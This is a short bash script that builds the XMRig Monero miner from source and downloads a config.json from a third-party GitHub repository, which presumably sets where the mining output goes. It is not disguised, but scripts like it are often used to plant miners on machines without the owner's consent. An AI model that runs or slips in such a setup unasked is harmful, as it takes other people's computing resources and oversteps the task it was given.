#!/bin/bash
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev \

git clone https://github.com/xmrig/xmrig.git 

cd xmrig && mkdir build && cd build \

cmake .. && make

wget https://raw.githubusercontent.com/basetrue/home/master/config.json
